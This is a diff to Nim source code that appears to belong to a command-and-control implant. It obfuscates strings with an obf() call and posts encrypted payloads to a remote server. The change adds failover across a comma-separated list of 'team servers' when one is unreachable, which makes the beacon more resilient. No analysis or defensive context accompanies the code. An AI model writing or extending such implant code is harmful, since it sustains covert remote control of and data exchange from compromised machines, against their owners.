@@ -88,11 +88,13 @@ proc buildWirePayload(plain: string): string =
 
 proc baseUrl(): string =
   # Builds the base URL from the channel, host, port, and path
-  let p = parsePortDigits(port)
-  if p == 0:
+  let sep = obf(",")
+  let h = host.split(sep)[0]
+  let pt = port.split(sep)[0]
+  if parsePortDigits(pt) == 0:
     return ""
   let scheme = if channel == obf("https"): obf("https://") else: obf("http://")
-  scheme & host & obf(":") & port & path
+  scheme & h & obf(":") & pt & path.split(sep)[0]
 
 proc exchangeUrl(url: string; payload: string): HttpResponse =
   # Posts the payload to the URL and returns the decrypted response
@@ -140,8 +142,18 @@ proc exchangeUrl(url: string; payload: string): HttpResponse =
     HttpResponse()
 
 proc exchange(payload: string): HttpResponse =
-  # Sends the payload to the base URL
-  exchangeUrl(baseUrl(), payload)
+  # Sends the payload to the base URL, rotating team servers when one is unreachable
+  result = exchangeUrl(baseUrl(), payload)
+  if result.ok:
+    return
+  let sep = obf(",")
+  let hs = host.split(sep)
+  let ps = port.split(sep)
+  let xs = path.split(sep)
+  if hs.len > 1 and hs.len == ps.len and hs.len == xs.len:
+    host = join(hs[1 ..^ 1], sep) & sep & hs[0]
+    port = join(ps[1 ..^ 1], sep) & sep & ps[0]
+    path = join(xs[1 ..^ 1], sep) & sep & xs[0]
 
 proc httpPost*(body: string): HttpResponse =
   # Posts the body through the HTTP exchange
